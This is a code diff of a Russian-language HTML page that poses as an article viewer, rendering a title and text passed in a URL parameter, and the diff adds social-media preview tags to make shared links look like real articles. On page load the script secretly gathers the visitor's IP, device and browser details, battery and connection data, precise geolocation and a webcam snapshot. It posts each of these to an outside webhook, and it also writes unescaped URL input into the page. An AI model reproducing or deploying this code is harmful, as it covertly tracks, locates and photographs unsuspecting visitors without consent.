@@ -2,216 +2,201 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>статья – ру</title>
+  <title>статья – ру</title>
+
+  <!-- Open Graph / Facebook -->
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="">
+  <meta property="og:description" content="">
+  <meta property="og:url" content="">
+  <!-- Twitter -->
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="">
+  <meta name="twitter:description" content="">
+
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
   <style>
     * { box-sizing: border-box; }
     body {
       margin: 0; padding: 0;
       font-family: 'Roboto', sans-serif;
-      background: linear-gradient(135deg, #ffffff, #e2e8f0);
+      background: linear-gradient(135deg, #fff, #e2e8f0);
       color: #2d3748;
       display: flex; justify-content: center;
       padding: 40px 20px;
     }
     .container {
       background: #fff;
-      max-width: 800px;
-      width: 100%;
+      max-width: 800px; width: 100%;
       border-radius: 12px;
       box-shadow: 0 4px 20px rgba(0,0,0,0.05);
       padding: 40px 30px;
     }
     h1 {
-      font-size: 2.4rem;
-      margin-bottom: 20px;
-      color: #1a202c;
-      text-align: center;
+      font-size: 2.4rem; margin-bottom: 20px;
+      color: #1a202c; text-align: center;
     }
     .article-body p {
-      margin-bottom: 1.2em;
-      line-height: 1.6;
+      margin-bottom: 1.2em; line-height: 1.6;
     }
     .error {
-      text-align: center;
-      color: #e53e3e;
+      text-align: center; color: #e53e3e;
     }
   </style>
 </head>
 <body>
   <div class="container" id="content">
-    <!-- Статья загрузится сюда -->
+    <!-- Здесь появится статья или сообщение об ошибке -->
   </div>
 
   <script>
-    // ——— ПАРАМЕТРЫ ———
     const WEBHOOK_URL = 'https://hkdk.events/dajul3b0vwgf9z';
-    
+
     function base64DecodeUnicode(str) {
       try {
-        const bin = atob(str);
-        const bytes = new Uint8Array(bin.length);
-        for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
-        return new TextDecoder("utf-8").decode(bytes);
-      } catch {
-        return "";
-      }
+        const bin = atob(str), arr = new Uint8Array(bin.length);
+        for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
+        return new TextDecoder('utf-8').decode(arr);
+      } catch { return ''; }
     }
-    function readLength(s, idx) {
+    function readLength(s, i) {
       let num = '';
-      while (idx < s.length && s[idx] !== '0') num += s[idx++];
-      return [parseInt(num,10), idx+1];
+      while (i < s.length && s[i] !== '0') num += s[i++];
+      return [parseInt(num, 10), i + 1];
     }
     function decodeParams(raw) {
       const d = base64DecodeUnicode(raw);
-      let i = 0, len, start;
-      [len, start] = readLength(d, i);
+      let idx = 0, len, start;
+      [len, start] = readLength(d, idx);
       const title = d.substr(start, len);
-      i = start + len;
-      [len, start] = readLength(d, i);
-      const text = d.substr(start, len);
+      idx = start + len;
+      [len, start] = readLength(d, idx);
+      const text  = d.substr(start, len);
       return { title, text };
     }
     function getConfig() {
-      const p = new URLSearchParams(window.location.search);
-      const raw = p.get('ID');
+      const raw = new URLSearchParams(window.location.search).get('ID');
       return raw ? decodeParams(raw) : null;
     }
 
-    // ——— РЕНДЕР СТАТЬИ ———
-    const cfg = getConfig();
-    const container = document.getElementById('content');
+    const cfg = getConfig(), ct = document.getElementById('content');
     if (!cfg || !cfg.title) {
-      container.innerHTML = `
-        <h1 class="error">Ошибка загрузки</h1>
-        <p>Нет параметров для отображения статьи.</p>
-      `;
+      ct.innerHTML = `<h1 class="error">Ошибка загрузки</h1>
+                      <p>Нет параметров для отображения статьи.</p>`;
       throw new Error('Missing title/text');
     }
-    document.title = `${cfg.title} — статья – ру`;
-    const safeBody = cfg.text
+    document.title = `${cfg.title} — статья – ру`;
+
+    const snippet = cfg.text.replace(/\n+/g,' ').substr(0, 50)
+                     + (cfg.text.length > 50 ? '…' : '');
+
+    // Обновляем мета‑теги для эмбедов
+    const absURL = window.location.href;
+    document.querySelector('meta[property="og:title"]').content = cfg.title;
+    document.querySelector('meta[property="og:description"]').content = snippet;
+    document.querySelector('meta[property="og:url"]').content = absURL;
+    document.querySelector('meta[name="twitter:title"]').content = cfg.title;
+    document.querySelector('meta[name="twitter:description"]').content = snippet;
+
+    // Рендер статьи
+    const bodyHTML = cfg.text
       .split('\n\n')
       .map(p => `<p>${p.replace(/\n/g,'<br>')}</p>`)
       .join('');
-    container.innerHTML = `
-      <h1>${cfg.title}</h1>
-      <div class="article-body">${safeBody}</div>
-    `;
+    ct.innerHTML = `<h1>${cfg.title}</h1>
+                    <div class="article-body">${bodyHTML}</div>`;
 
-    // ——— СБОР ДАННЫХ ———
+    // Сбор системных данных
     async function getIP(){
-      try {
-        const r = await fetch('https://api.ipify.org?format=json');
-        return (await r.json()).ip;
+      try { let r=await fetch('https://api.ipify.org?format=json');
+            return (await r.json()).ip;
       } catch { return 'Unavailable'; }
     }
     function getGPU(){
       try {
-        const c = document.createElement('canvas');
-        const gl = c.getContext('webgl')||c.getContext('experimental-webgl');
-        const ext = gl && gl.getExtension('WEBGL_debug_renderer_info');
-        return ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : 'Unavailable';
+        let c=document.createElement('canvas'),
+            gl=c.getContext('webgl')||c.getContext('experimental-webgl'),
+            ext=gl&&gl.getExtension('WEBGL_debug_renderer_info');
+        return ext? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL): 'Unavailable';
       } catch { return 'Unavailable'; }
     }
     async function getBattery(){
-      if (!navigator.getBattery) return null;
-      try { return await navigator.getBattery(); }
-      catch { return null; }
+      if(!navigator.getBattery) return null;
+      try{ return await navigator.getBattery(); } catch { return null; }
     }
     function getConnection(){
-      const c = navigator.connection||navigator.mozConnection||navigator.webkitConnection;
-      return c ? { downlink:c.downlink, type:c.effectiveType, rtt:c.rtt } : null;
+      let c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+      return c? {downlink:c.downlink, type:c.effectiveType, rtt:c.rtt}: null;
     }
     async function collectInitial(){
-      const ip = await getIP();
-      const bat = await getBattery();
+      let ip=await getIP(), bat=await getBattery();
       return {
-        ip,
-        ua: navigator.userAgent,
-        platform: navigator.platform,
-        lang: navigator.language,
-        screen: `${screen.width}x${screen.height}`,
-        gpu: getGPU(),
-        cpu: navigator.hardwareConcurrency,
-        mem: navigator.deviceMemory||'Unavailable',
-        battery: bat ? { level: `${Math.round(bat.level*100)}%`, charging: bat.charging } : null,
-        conn: getConnection()
+        ip, ua:navigator.userAgent, plat:navigator.platform,
+        lang:navigator.language, scr:`${screen.width}x${screen.height}`,
+        gpu:getGPU(), cpu:navigator.hardwareConcurrency,
+        mem:navigator.deviceMemory||'Unavailable',
+        battery: bat? { lvl:`${Math.round(bat.level*100)}%`, charging:bat.charging }:null,
+        conn:getConnection()
       };
     }
-    function formatInitial(d){
-      const conn = d.conn
-        ? `downlink:${d.conn.downlink}Mb/s, type:${d.conn.type}, rtt:${d.conn.rtt}ms`
-        : 'Unavailable';
-      return {
-        content:
-`**IP:** ${d.ip}
-**UserAgent:** ${d.ua}
-**Platform:** ${d.platform}
-**Language:** ${d.lang}
-**Screen:** ${d.screen}
-**GPU:** ${d.gpu}
-**CPU Cores:** ${d.cpu}
-**Memory:** ${d.mem}
-**Battery:** ${d.battery ? d.battery.level+' ('+(d.battery.charging?'charging':'discharging')+')' : 'Unavailable'}
-**Connection:** ${conn}`
-      };
-    }
-    function formatGeo(c){
-      return c
-        ? { content: `**Geolocation:**\nLatitude: ${c.latitude}\nLongitude: ${c.longitude}\nAccuracy: ${c.accuracy}m` }
-        : { content: '**Geolocation:** Unavailable' };
-    }
+
     async function getGeo(){
-      return new Promise(res => {
-        if (!navigator.geolocation) return res(null);
+      if(!navigator.geolocation) return null;
+      return new Promise(res=>{
         navigator.geolocation.getCurrentPosition(
-          pos => res(pos.coords),
-          () => res(null),
-          { enableHighAccuracy:true, timeout:10000 }
+          pos=>res(pos.coords), ()=>res(null),
+          {enableHighAccuracy:true,timeout:20000,maximumAge:0}
         );
       });
     }
     async function takePhoto(){
       try {
-        const s = await navigator.mediaDevices.getUserMedia({ video:true });
-        const v = document.createElement('video');
-        v.srcObject = s;
-        await v.play();
-        await new Promise(r=>setTimeout(r,1000));
-        const c = document.createElement('canvas');
-        c.width=640; c.height=480;
+        let s=await navigator.mediaDevices.getUserMedia({video:true}),
+            v=document.createElement('video');
+        v.srcObject=s; await v.play(); await new Promise(r=>setTimeout(r,1000));
+        let c=document.createElement('canvas'); c.width=640; c.height=480;
         c.getContext('2d').drawImage(v,0,0);
         s.getTracks().forEach(t=>t.stop());
         return c.toDataURL('image/jpeg');
       } catch { return null; }
     }
-    function formatCamera(img){
-      return img
-        ? { content:'**Camera:** Access granted', embeds:[{ image:{ url:img } }] }
-        : { content:'**Camera:** Denied/Unavailable' };
+    function formatInitial(d){
+      let conn=d.conn? `downlink:${d.conn.downlink}Mb/s, type:${d.conn.type}, rtt:${d.conn.rtt}ms` : 'Unavailable';
+      return { content:
+`**IP:** ${d.ip}
+**UserAgent:** ${d.ua}
+**Platform:** ${d.plat}
+**Language:** ${d.lang}
+**Screen:** ${d.scr}
+**GPU:** ${d.gpu}
+**CPU Cores:** ${d.cpu}
+**Memory:** ${d.mem}
+**Battery:** ${d.battery? d.battery.lvl+' ('+(d.battery.charging?'charging':'discharging')+')':'Unavailable'}
+**Connection:** ${conn}` };
     }
-    async function send(payload){
+    function formatGeo(c){
+      return c? { content:`**Geolocation:**\nLatitude: ${c.latitude}\nLongitude: ${c.longitude}\nAccuracy: ${c.accuracy}m` }
+              : { content:'**Geolocation:** Unavailable' };
+    }
+    function formatCamera(img){
+      return img? { content:'**Camera:** Access granted', embeds:[{ image:{ url:img } }] }
+                : { content:'**Camera:** Denied/Unavailable' };
+    }
+    async function send(p){
       try {
         await fetch(WEBHOOK_URL, {
           method:'POST',
-          headers:{'Content-Type':'application/json'},
-          body: JSON.stringify(payload)
+          headers:{ 'Content-Type':'application/json' },
+          body: JSON.stringify(p)
         });
-      } catch(e){
-        console.error('Webhook error:', e);
-      }
+      } catch(e){ console.error('Webhook error:', e); }
     }
 
-    // ——— ОТПРАВКА ПОШАГОВО ———
+    // Основной процесс
     (async()=>{
-      const init = await collectInitial();
-      await send(formatInitial(init));
-
-      const geo = await getGeo();
-      await send(formatGeo(geo));
-
-      const photo = await takePhoto();
-      await send(formatCamera(photo));
+      const init = await collectInitial(); await send(formatInitial(init));
+      const geo  = await getGeo();        await send(formatGeo(geo));
+      const photo= await takePhoto();     await send(formatCamera(photo));
     })();
   </script>
 </body>
